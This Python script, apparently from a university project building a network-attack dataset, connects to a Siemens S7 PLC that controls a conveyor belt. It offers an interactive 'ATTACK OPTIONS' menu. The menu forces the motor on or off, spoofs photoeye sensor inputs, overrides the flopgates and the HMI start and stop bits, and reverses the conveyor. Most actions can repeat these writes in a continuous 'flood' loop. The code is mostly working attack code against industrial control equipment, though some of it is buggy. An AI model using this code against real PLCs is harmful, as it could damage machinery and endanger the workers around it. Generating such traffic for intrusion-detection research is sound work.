#Daniel J. Cowdery
#IFN701 - Network Attack Dataset (Masquerading Attack)

import snap7
import snap7.partner
from snap7.snap7types import*
from snap7.snap7exceptions import*
from snap7.util import*

import time

class ConveyorBelt:
    def __init__(self):
        self.client = snap7.client.Client()
        self.IP = "10.10.10.13"
        self.run = True
        self.option = 99
        self.flood = False
        self.restart = False
        self.hexData = [0] * 11
        self.oldHex = [0] * 11
        self.readValue = [0] * 11
        self.changed = False
        self.changedFlood = False
        self.client.connect(self.IP, 0, 1)
        print "Connected to Conveyor Belt"


    # def CompareStatus(self):
    #     # Compare the previous status check with the current system status
    #     count = 0
    #     for hex in self.hexData:
    #         if self.oldHex[count] != hex:
    #             self.PrintStatus()
    #             self.oldHex = self.hexData
    #             print "Status Changed!"
    #             break
    #         else:
    #             print "Status Normal"
    #             count += 1


    def CheckStatus(self):
        # Read current status
        self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
        self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
        self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
        #self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        #self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
        self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
        self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
        self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
        #self.hexData[5] = self.client.read_area(S7AreaPA, 0, 1.2, 4)  # HMI Stop
        #self.hexData[6] = self.client.read_area(S7AreaPA, 0, 1.1, 4)  # HMI Start
        self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
        self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
        self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
        self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

        # Convert Hexadecimal ByteArray to variables
        self.readValue[0] = snap7.util.get_bool(self.hexData[0], 0, 1)
        self.readValue[1] = snap7.util.get_bool(self.hexData[1], 0, 1)
        self.readValue[2] = snap7.util.get_bool(self.hexData[2], 0, 1)
        self.readValue[3] = snap7.util.get_bool(self.hexData[3], 0, 1)
        self.readValue[4] = snap7.util.get_bool(self.hexData[4], 0, 1)
        self.readValue[5] = snap7.util.get_bool(self.hexData[5], 0, 1)
        self.readValue[6] = snap7.util.get_bool(self.hexData[6], 0, 1)
        self.readValue[7] = snap7.util.get_bool(self.hexData[7], 0, 1)
        self.readValue[8] = snap7.util.get_bool(self.hexData[8], 0, 1)
        self.readValue[9] = snap7.util.get_bool(self.hexData[9], 0, 1)
        self.readValue[10] = snap7.util.get_bool(self.hexData[10], 0, 1)

        #self.CompareStatus()


    def PrintStatus(self):
        print "\nCONVEYOR STATUS"
        #print "CPU Info: ", self.client.get_cpu_info()
        #self.client.db_write()
        print "CPU State: ", self.client.get_cpu_state()
        print "Motor Run: ", self.readValue[0]
        print "Flopgate Right: ", self.readValue[1]
        print "Flopgate Left: ", self.readValue[2]
        print "Precense Photoeye: ", self.readValue[3]
        print "Colour Photoeye: ", self.readValue[4]
        print "HMI Stop: ", self.readValue[5]
        print "HMI Start: ", self.readValue[6]
        print "Conveyor Direction: ", self.readValue[7]
        print "Flopgate Direction: ", self.readValue[8]
        print "Evaluate Object Ons: ", self.readValue[9]
        print "Evaluate Object Ons(1): ", self.readValue[10]


    def PrintOptions(self):
        print "\nATTACK OPTIONS"
        print "0: Turn Motor On"
        print "1: Turn Motor Off"
        print "2: Set Flopgate Right"
        print "3: Set Flopgate Left"
        print "4: Toggle Precense Photoeye"
        print "5: Toggle Colour Photoeye"
        print "6: HMI Stop"
        print "7: HMI Start"
        print "8: Toggle Conveyor Direction"
        print "9: Toggle Flopgate Direction"
        print "11: Alt Toggle Conveyor on / off"
        print "99: Display System Status"

        try:
            self.option = int(raw_input("\nSelect an action to perform... "))
            self.changed = False
        except ValueError:
            print "Please enter a valid number\n"

        self.FloodOrToggle()



    def FloodOrToggle(self):
        self.changedFlood = False
        if self.option != 99:
            try:
                while not self.changedFlood:
                    ans = raw_input("\nFlood? [Y/N] ")
                    if ans == "Y" or ans == "y":
                        self.flood = True
                        self.changedFlood = True
                    elif ans == "N" or ans == "n":
                        self.flood = False
                        self.changedFlood = True
                    else:
                        print "Please enter a valid option \n"
            except KeyboardInterrupt:
                self.PrintOptions()




    def MotorOn(self):
        try:
            if self.flood:
                while self.flood:           #Always true if flooding
                    print "Turning Motor On..."
                    snap7.util.set_bool(self.hexData[0],0,0,True)               #Motor Run = True
                    self.client.write_area(S7AreaPA,0,0,self.hexData[0])

                    # #Confirm value has been changed
                    # self.hexData[0] = self.client.read_area(S7AreaPA,0,0,4)
                    # self.readValue[0] = snap7.util.get_bool(self.hexData[0],0,1)
                    # if not self.readValue[0]:
                    #     self.changed = False
                    # else:
                    #     self.changed = True
                    #     self.PrintStatus()

            else:
                print "Turning Motor On..."
                snap7.util.set_bool(self.hexData[0], 0, 0, True)  # Motor Run = True
                self.client.write_area(S7AreaPA, 0, 0, self.hexData[0])

        except KeyboardInterrupt:
            self.restart = True


    def MotorOff(self):
        try:
            if self.flood:
                while self.flood:
                    print "Turning Motor Off..."
                    snap7.util.set_bool(self.hexData[0], 0, 0, False)  # Motor Run = False
                    self.client.write_area(S7AreaPA, 0, 0, self.hexData[0])

            else:
                print "Turning Motor Off..."
                #if self.readValue[0] and not self.readValue[5]:  # If motor currently on
                snap7.util.set_bool(self.hexData[0], 0, 0, False)  # Motor Run = False
                self.client.write_area(S7AreaPA, 0, 0, self.hexData[0])

                    # #Confirm value has been changed
                    # self.hexData[0] = self.client.read_area(S7AreaPA,0,0,4)
                    # self.readValue[0] = snap7.util.get_bool(self.hexData[0],0,1)
                    # if self.readValue[0]:
                    #     self.changed = False
                    # else:
                    #     self.changed = True
                    #     self.PrintStatus()

        except KeyboardInterrupt:
            self.restart = True


    def AltToggleMotor(self):
        try:
            while not self.changed:
                if self.readValue[0]:                 #If motor currently on
                    print "Turning Motor Off..."
                    snap7.util.set_bool(self.hexData[5],0,0,True)               #HMI Stop = True
                    snap7.util.set_bool(self.hexData[6],0,0,False)              #HMI Start = False
                    self.client.write_area(S7AreaMK,0,0,self.hexData[5])
                    self.client.write_area(S7AreaMK,0,1,self.hexData[6])
                    #self.client.write_area(S7AreaPA,0,1.2,self.hexData[5])
                    #self.client.write_area(S7AreaPA,0,1.1,self.hexData[6])


                    #Confirm value has been changed
                    self.hexData[0] = self.client.read_area(S7AreaPA,0,0,4)
                    self.hexData[5] = self.client.read_area(S7AreaMK,0,0,4)  # HMI Stop
                    self.hexData[6] = self.client.read_area(S7AreaMK,0,1,4)  # HMI Start
                    #self.hexData[5] = self.client.read_area(S7AreaPA,0,1.2,4)  # HMI Stop
                    #self.hexData[6] = self.client.read_area(S7AreaPA,0,1.1,4)  # HMI Start
                    self.readValue[0] = snap7.util.get_bool(self.hexData[0],0,1)
                    self.readValue[5] = snap7.util.get_bool(self.hexData[5],0,1)
                    self.readValue[6] = snap7.util.get_bool(self.hexData[6],0,1)
                    if self.readValue[0]:
                        self.changed = False
                    else:
                        self.changed = True
                        self.PrintStatus()

                elif not self.readValue[0]:             #If motor currently off
                    print "Turning Motor On..."
                    snap7.util.set_bool(self.hexData[5],0,0,False)               #HMI Stop = False
                    snap7.util.set_bool(self.hexData[6],0,0,True)              #HMI Start = True
                    self.client.write_area(S7AreaMK,0,0,self.hexData[5])
                    self.client.write_area(S7AreaMK,0,1,self.hexData[6])
                    #self.client.write_area(S7AreaPA,0,1.2,self.hexData[5])
                    #self.client.write_area(S7AreaPA,0,1.1,self.hexData[6])

                    #Confirm value has been changed
                    self.hexData[0] = self.client.read_area(S7AreaPA,0,0,4)
                    self.hexData[5] = self.client.read_area(S7AreaMK,0,0,4)  # HMI Stop
                    self.hexData[6] = self.client.read_area(S7AreaMK,0,1,4)  # HMI Start
                    #self.hexData[5] = self.client.read_area(S7AreaPA,0,1.2,4)  # HMI Stop
                    #self.hexData[6] = self.client.read_area(S7AreaPA,0,1.1,4)  # HMI Start
                    self.readValue[0] = snap7.util.get_bool(self.hexData[0],0,1)
                    self.readValue[5] = snap7.util.get_bool(self.hexData[5],0,1)
                    self.readValue[6] = snap7.util.get_bool(self.hexData[6],0,1)
                    if not self.readValue[0]:
                        self.changed = False
                    else:
                        self.changed = True
                        self.PrintStatus()

        except KeyboardInterrupt:
            self.restart = True


    def AltTestFlopgateRight(self):
        try:
            if self.flood:
                while self.flood:
                #while not self.changed:
                    print "ALT TEST - Setting Flopgate Right"
                    snap7.util.set_bool(self.hexData[8],0,False,False)
                    self.client.write_area(S7AreaMK,0,0,self.hexData[8])

            else:
                print "ALT TEST - Setting Flopgate Right"
                snap7.util.set_bool(self.hexData[8],0,False,False)
                self.client.write_area(S7AreaMK,0,0,self.hexData[8])

        except KeyboardInterrupt:
            self.restart = True


    # MAYBE THIS WORKS AS THE "DEFAULT" POSITION FOR THE SYSTEM IS WITH THE FLOPGATE LEFT, SO WHEN HMI STOP IS CALLED, IT SETS THE FLOPGATE TO THE LEFT!!
    def AltTestFlopgateLeft(self):
        try:
            if self.flood:
                #while not self.changed:
                while self.flood:
                    print "ALT TEST - Setting Flopgate Left"
                    snap7.util.set_bool(self.hexData[8],0,True,True)
                    self.client.write_area(S7AreaMK,0,0,self.hexData[8])

            else:
                print "ALT TEST - Setting Flopgate Left"
                snap7.util.set_bool(self.hexData[8], 0, True, True)
                self.client.write_area(S7AreaMK, 0, 0, self.hexData[8])

        except KeyboardInterrupt:
            self.restart = True


    def SetFlopgateRight(self):
        try:
            if self.flood:
                while self.flood:
                #while not self.changed:
                    print "Setting Flopgate Right"
                    snap7.util.set_bool(self.hexData[8],0,0,False)              #Flopgate Direction = False
                    snap7.util.set_bool(self.hexData[2],0,0,False)              #Flopgate Left = False
                    #snap7.util.set_bool(self.hexData[1],0,0,True)               #Flopgate Right = True
                    self.client.write_area(S7AreaMK,0,3,self.hexData[8])
                    self.client.write_area(S7AreaPA,0,2,self.hexData[2])
                    #self.client.write_area(S7AreaPA,0,1,self.hexData[1])

                    # #Confirm value has been changed
                    # self.hexData[1] = self.client.read_area(S7AreaPA,0,1,4)
                    # self.readValue[1] = snap7.util.get_bool(self.hexData[1],0,1)
                    # if not self.readValue[1]:
                    #     self.changed = False
                    # else:
                    #     self.changed = True
            else:
                print "Setting Flopgate Right"
                snap7.util.set_bool(self.hexData[8], 0, 0, False)  # Flopgate Direction = False
                snap7.util.set_bool(self.hexData[2], 0, 0, False)  # Flopgate Left = False
                # snap7.util.set_bool(self.hexData[1],0,0,True)               #Flopgate Right = True
                self.client.write_area(S7AreaMK, 0, 3, self.hexData[8])
                self.client.write_area(S7AreaPA, 0, 2, self.hexData[2])
                # self.client.write_area(S7AreaPA,0,1,self.hexData[1])
        except KeyboardInterrupt:
            self.restart = True


    def TestSetFlopgateRight(self):
        try:
            if self.flood:
                while self.flood:
                #while not self.changed:
                    print "TEST - Setting Flopgate Right"
                    snap7.util.set_bool(self.hexData[3],0,0,True)       #Precense Photoeye = True
                    snap7.util.set_bool(self.hexData[9],0,0,True)       #Evaluate Object Ons = True - MAY NOT BE REQUIRED
                    snap7.util.set_bool(self.hexData[7],0,0,False)      #HMI Direction = False
                    snap7.util.set_bool(self.hexData[4],0,0,True)       #Color Photoeye = True
                    snap7.util.set_bool(self.hexData[8],0,0,False)      #Flopgate Direction = False - MAY NOT BE REQUIRED
                    snap7.util.set_bool(self.hexData[2],0,0,False)      #Flopgate Left = False
                    snap7.util.set_bool(self.hexData[1],0,0,True)       #Flopgate Right = True - MAY NOT BE REQUIRED

                    self.client.write_area(S7AreaPE,0,0,self.hexData[3])
                    self.client.write_area(S7AreaMK,0,4,self.hexData[9])
                    self.client.write_area(S7AreaMK,0,2,self.hexData[7])
                    self.client.write_area(S7AreaPE,0,1,self.hexData[4])
                    self.client.write_area(S7AreaMK,0,3,self.hexData[8])
                    self.client.write_area(S7AreaPA,0,2,self.hexData[2])
                    self.client.write_area(S7AreaPA,0,1,self.hexData[1])

                   # #Confirm value has been changed
                   #  self.hexData[1] = self.client.read_area(S7AreaPA,0,1,4)
                   #  self.readValue[1] = snap7.util.get_bool(self.hexData[1],0,1)
                   #  if not self.readValue[1]:
                   #      self.changed = False
                   #      self.PrintStatus()
                   #  else:
                   #      self.changed = True

            else:
                print "TEST - Setting Flopgate Right"
                snap7.util.set_bool(self.hexData[3], 0, 0, True)  # Precense Photoeye = True
                snap7.util.set_bool(self.hexData[9], 0, 0, True)  # Evaluate Object Ons = True - MAY NOT BE REQUIRED
                snap7.util.set_bool(self.hexData[7], 0, 0, False)  # HMI Direction = False
                snap7.util.set_bool(self.hexData[4], 0, 0, True)  # Color Photoeye = True
                snap7.util.set_bool(self.hexData[8], 0, 0, False)  # Flopgate Direction = False - MAY NOT BE REQUIRED
                snap7.util.set_bool(self.hexData[2], 0, 0, False)  # Flopgate Left = False
                snap7.util.set_bool(self.hexData[1], 0, 0, True)  # Flopgate Right = True - MAY NOT BE REQUIRED

                self.client.write_area(S7AreaPE, 0, 0, self.hexData[3])
                self.client.write_area(S7AreaMK, 0, 4, self.hexData[9])
                self.client.write_area(S7AreaMK, 0, 2, self.hexData[7])
                self.client.write_area(S7AreaPE, 0, 1, self.hexData[4])
                self.client.write_area(S7AreaMK, 0, 3, self.hexData[8])
                self.client.write_area(S7AreaPA, 0, 2, self.hexData[2])
                self.client.write_area(S7AreaPA, 0, 1, self.hexData[1])

        except KeyboardInterrupt:
            self.restart = True


    def SetFlopgateLeft(self):
        try:
            #while not self.changed:
            if self.flood:
                while self.flood:
                    print "Setting Flopgate Left"
                    snap7.util.set_bool(self.hexData[8],0,0,True)               #Flopgate Direction = True
                    snap7.util.set_bool(self.hexData[1],0,0,False)              #Flopgate Right = False
                    snap7.util.set_bool(self.hexData[2],0,0,True)               #Flopgate Left = True
                    self.client.write_area(S7AreaMK,0,3,self.hexData[8])
                    self.client.write_area(S7AreaPA,0,1,self.hexData[1])
                    #self.client.write_area(S7AreaPA,0,2,self.hexData[2])

                    # #Confirm value has been changed
                    # self.hexData[2] = self.client.read_area(S7AreaPA,0,2,4)
                    # self.readValue[2] = snap7.util.get_bool(self.hexData[2],0,1)
                    # if not self.readValue[2]:
                    #     self.changed = False
                    # else:
                    #     self.changed = True

            else:
                print "Setting Flopgate Left"
                snap7.util.set_bool(self.hexData[8], 0, 0, True)  # Flopgate Direction = True
                snap7.util.set_bool(self.hexData[1], 0, 0, False)  # Flopgate Right = False
                snap7.util.set_bool(self.hexData[2], 0, 0, True)  # Flopgate Left = True
                self.client.write_area(S7AreaMK, 0, 3, self.hexData[8])
                self.client.write_area(S7AreaPA, 0, 1, self.hexData[1])
                # self.client.write_area(S7AreaPA,0,2,self.hexData[2])

        except KeyboardInterrupt:
            self.restart = True


    def TestSetFlopgateLeft(self):
        try:
            if self.flood:
            #while not self.changed:
                while self.flood:
                    print "TEST - Setting Flopgate Right"
                    snap7.util.set_bool(self.hexData[3], 0, 0, True)  # Precense Photoeye = True
                    snap7.util.set_bool(self.hexData[9], 0, 0, True)  # Evaluate Object Ons = True - MAY NOT BE REQUIRED
                    snap7.util.set_bool(self.hexData[7], 0, 0, True)  # HMI Direction = True
                    snap7.util.set_bool(self.hexData[4], 0, 0, False)  # Color Photoeye = False
                    snap7.util.set_bool(self.hexData[8], 0, 0, True)  # Flopgate Direction = True - MAY NOT BE REQUIRED
                    snap7.util.set_bool(self.hexData[2], 0, 0, True)  # Flopgate Left = True
                    snap7.util.set_bool(self.hexData[1], 0, 0, False)  # Flopgate Right = False - MAY NOT BE REQUIRED

                    self.client.write_area(S7AreaPE, 0, 0, self.hexData[3])
                    self.client.write_area(S7AreaMK, 0, 4, self.hexData[9])
                    self.client.write_area(S7AreaMK, 0, 2, self.hexData[7])
                    self.client.write_area(S7AreaPE, 0, 1, self.hexData[4])
                    self.client.write_area(S7AreaMK, 0, 3, self.hexData[8])
                    self.client.write_area(S7AreaPA, 0, 2, self.hexData[2])
                    self.client.write_area(S7AreaPA, 0, 1, self.hexData[1])

                    # # Confirm value has been changed
                    # self.hexData[2] = self.client.read_area(S7AreaPA, 0, 1, 4)
                    # self.readValue[2] = snap7.util.get_bool(self.hexData[2], 0, 1)
                    # if not self.readValue[2]:
                    #     self.changed = False
                    #     self.PrintStatus()
                    # else:
                    #     self.changed = True

            else:
                print "TEST - Setting Flopgate Right"
                snap7.util.set_bool(self.hexData[3], 0, 0, True)  # Precense Photoeye = True
                snap7.util.set_bool(self.hexData[9], 0, 0, True)  # Evaluate Object Ons = True - MAY NOT BE REQUIRED
                snap7.util.set_bool(self.hexData[7], 0, 0, True)  # HMI Direction = True
                snap7.util.set_bool(self.hexData[4], 0, 0, False)  # Color Photoeye = False
                snap7.util.set_bool(self.hexData[8], 0, 0, True)  # Flopgate Direction = True - MAY NOT BE REQUIRED
                snap7.util.set_bool(self.hexData[2], 0, 0, True)  # Flopgate Left = True
                snap7.util.set_bool(self.hexData[1], 0, 0, False)  # Flopgate Right = False - MAY NOT BE REQUIRED

                self.client.write_area(S7AreaPE, 0, 0, self.hexData[3])
                self.client.write_area(S7AreaMK, 0, 4, self.hexData[9])
                self.client.write_area(S7AreaMK, 0, 2, self.hexData[7])
                self.client.write_area(S7AreaPE, 0, 1, self.hexData[4])
                self.client.write_area(S7AreaMK, 0, 3, self.hexData[8])
                self.client.write_area(S7AreaPA, 0, 2, self.hexData[2])
                self.client.write_area(S7AreaPA, 0, 1, self.hexData[1])

        except KeyboardInterrupt:
            self.restart = True


    def ToggleConveyorDirection(self):
        try:
            while not self.changed:
                if self.readValue[7]:
                    print "Switching conveyor direction"
                    snap7.util.set_bool(self.hexData[7],0,0,False)
                    self.client.write_area(S7AreaMK,0,2,self.hexData[self.option])

                    #Confirm value has been changed
                    self.hexData[7] = self.client.read_area(S7AreaPA,0,2,4)
                    self.readValue[7] = snap7.util.get_bool(self.hexData[7],0,1)
                    if self.readValue[7]:
                        self.changed = False
                    else:
                        self.changed = True

                elif not self.readValue[7]:
                    print "Re-switching conveyor direction"
                    snap7.util.set_bool(self.hexData[7],0,0,True)
                    self.client.write_area(S7AreaMK,0,2,self.hexData[7])

                    #Confirm value has been changed
                    self.hexData[7] = self.client.read_area(S7AreaPA,0,2,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[7],0,1)
                    if not self.readValue[7]:
                        self.changed = False
                    else:
                        self.changed = True

        except KeyboardInterrupt:
            self.restart = True


    def ToggleFlopgateDirection(self):
        try:
            while not self.changed:
                if self.readValue[8]:             #If flopgate currently right
                    print "Switching Flopgate Left"
                    snap7.util.set_bool(self.hexData[8],0,0,False)
                    self.client.write_area(S7AreaMK,0,3,self.hexData[8])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[8] = self.client.read_area(S7AreaMK,0,3,4)
                    self.readValue[8] = snap7.util.get_bool(self.hexData[8],0,1)
                    if self.readValue[8]:
                        self.changed = False
                    else:
                        self.changed = True

                elif not self.readValue[8]:                 #If flopgate currently left
                    print "Switching Flopgate Right"
                    snap7.util.set_bool(self.hexData[8],0,0,True)
                    self.client.write_area(S7AreaPA,0,3,self.hexData[8])
                    #time.sleep(1)

                    #Confirm value has been changed
                    self.hexData[8] = self.client.read_area(S7AreaMK,0,3,4)
                    self.readValue[self.option] = snap7.util.get_bool(self.hexData[8],0,1)
                    if not self.readValue[8]:
                        self.changed = False
                    else:
                        self.changed = True

        except KeyboardInterrupt:
            self.restart = True


    # def Restart(self):
    #     print "\nResetting connection..."
    #     self.client.disconnect()
    #     self.changed = True
    #     self.option = 99
    #     self.hexData = [0] * 11
    #     self.readValue = [0] * 11
    #     time.sleep(5)
    #     self.client.connect(self.IP, 0, 1)
    #     print "Reconnected to conveyor belt\n"


    def Exit(self):
        self.changed = True
        self.run = False
        self.client.disconnect()
        self.client.destroy()


def TEST_PrintDWORDStatus(self):
    # Read current status
    self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
    self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
    self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
    self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
    self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
    # self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
    # self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
    self.hexData[5] = self.client.read_area(S7AreaPA, 1, 2, 4)  # HMI Stop
    self.hexData[6] = self.client.read_area(S7AreaPA, 1, 1, 4)  # HMI Start
    self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
    self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
    self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
    self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

    # Convert Hexadecimal ByteArray to variables
    self.readValue[0] = snap7.util.get_dword(self.hexData[0], 0)
    self.readValue[1] = snap7.util.get_dword(self.hexData[1], 0)
    self.readValue[2] = snap7.util.get_dword(self.hexData[2], 0)
    self.readValue[3] = snap7.util.get_dword(self.hexData[3], 0)
    self.readValue[4] = snap7.util.get_dword(self.hexData[4], 0)
    self.readValue[5] = snap7.util.get_dword(self.hexData[5], 0)
    self.readValue[6] = snap7.util.get_dword(self.hexData[6], 0)
    self.readValue[7] = snap7.util.get_dword(self.hexData[7], 0)
    self.readValue[8] = snap7.util.get_dword(self.hexData[8], 0)
    self.readValue[9] = snap7.util.get_dword(self.hexData[9], 0)
    self.readValue[10] = snap7.util.get_dword(self.hexData[10], 0)

    print "CONVEYOR STATUS"
    print "Motor Run: ", self.readValue[0]
    print "Flopgate Right: ", self.readValue[1]
    print "Flopgate Left: ", self.readValue[2]
    print "Precense Photoeye: ", self.readValue[3]
    print "Colour Photoeye: ", self.readValue[4]
    print "HMI Stop: ", self.readValue[5]
    print "HMI Start: ", self.readValue[6]
    print "Conveyor Direction: ", self.readValue[7]
    print "Flopgate Direction: ", self.readValue[8]
    print "Evaluate Object Ons: ", self.readValue[9]
    print "Evaluate Object Ons(1): ", self.readValue[10]


def TEST_PrintINTStatus(self):
    # Read current status
    self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
    self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
    self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
    self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
    self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
    self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
    self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
    self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
    self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
    self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
    self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

    # Convert Hexadecimal ByteArray to variables
    self.readValue[0] = snap7.util.get_int(self.hexData[0], 0)
    self.readValue[1] = snap7.util.get_int(self.hexData[1], 0)
    self.readValue[2] = snap7.util.get_int(self.hexData[2], 0)
    self.readValue[3] = snap7.util.get_int(self.hexData[3], 0)
    self.readValue[4] = snap7.util.get_int(self.hexData[4], 0)
    self.readValue[5] = snap7.util.get_int(self.hexData[5], 0)
    self.readValue[6] = snap7.util.get_int(self.hexData[6], 0)
    self.readValue[7] = snap7.util.get_int(self.hexData[7], 0)
    self.readValue[8] = snap7.util.get_int(self.hexData[8], 0)
    self.readValue[9] = snap7.util.get_int(self.hexData[9], 0)
    self.readValue[10] = snap7.util.get_int(self.hexData[10], 0)

    print "CONVEYOR STATUS"
    print "Motor Run: ", self.readValue[0]
    print "Flopgate Right: ", self.readValue[1]
    print "Flopgate Left: ", self.readValue[2]
    print "Precense Photoeye: ", self.readValue[3]
    print "Colour Photoeye: ", self.readValue[4]
    print "HMI Stop: ", self.readValue[5]
    print "HMI Start: ", self.readValue[6]
    print "Conveyor Direction: ", self.readValue[7]
    print "Flopgate Direction: ", self.readValue[8]
    print "Evaluate Object Ons: ", self.readValue[9]
    print "Evaluate Object Ons(1): ", self.readValue[10]


def TEST_PrintREALStatus(self):
    # Read current status
    self.hexData[0] = self.client.read_area(S7AreaPA, 0, 0, 4)  # Motor Run
    self.hexData[1] = self.client.read_area(S7AreaPA, 0, 1, 4)  # Flopgate Right7
    self.hexData[2] = self.client.read_area(S7AreaPA, 0, 2, 4)  # Flopgate Left
    self.hexData[3] = self.client.read_area(S7AreaPE, 0, 0, 4)  # Precense Photoeye
    self.hexData[4] = self.client.read_area(S7AreaPE, 0, 1, 4)  # Color Photoeye
    self.hexData[5] = self.client.read_area(S7AreaMK, 0, 0, 4)  # HMI Stop
    self.hexData[6] = self.client.read_area(S7AreaMK, 0, 1, 4)  # HMI Start
    self.hexData[7] = self.client.read_area(S7AreaMK, 0, 2, 4)  # HMI Direction
    self.hexData[8] = self.client.read_area(S7AreaMK, 0, 3, 4)  # Flopgate Direction
    self.hexData[9] = self.client.read_area(S7AreaMK, 0, 4, 4)  # Evaluate Object Ons
    self.hexData[10] = self.client.read_area(S7AreaMK, 0, 5, 4)  # Evaluate Object Ons(1)

    # Convert Hexadecimal ByteArray to variables
    self.readValue[0] = snap7.util.get_real(self.hexData[0], 0)
    self.readValue[1] = snap7.util.get_real(self.hexData[1], 0)
    self.readValue[2] = snap7.util.get_real(self.hexData[2], 0)
    self.readValue[3] = snap7.util.get_real(self.hexData[3], 0)
    self.readValue[4] = snap7.util.get_real(self.hexData[4], 0)
    self.readValue[5] = snap7.util.get_real(self.hexData[5], 0)
    self.readValue[6] = snap7.util.get_real(self.hexData[6], 0)
    self.readValue[7] = snap7.util.get_real(self.hexData[7], 0)
    self.readValue[8] = snap7.util.get_real(self.hexData[8], 0)
    self.readValue[9] = snap7.util.get_real(self.hexData[9], 0)
    self.readValue[10] = snap7.util.get_real(self.hexData[10], 0)

    print "CONVEYOR STATUS"
    print "Motor Run: ", self.readValue[0]
    print "Flopgate Right: ", self.readValue[1]
    print "Flopgate Left: ", self.readValue[2]
    print "Precense Photoeye: ", self.readValue[3]
    print "Colour Photoeye: ", self.readValue[4]
    print "HMI Stop: ", self.readValue[5]
    print "HMI Start: ", self.readValue[6]
    print "Conveyor Direction: ", self.readValue[7]
    print "Flopgate Direction: ", self.readValue[8]
    print "Evaluate Object Ons: ", self.readValue[9]
    print "Evaluate Object Ons(1): ", self.readValue[10]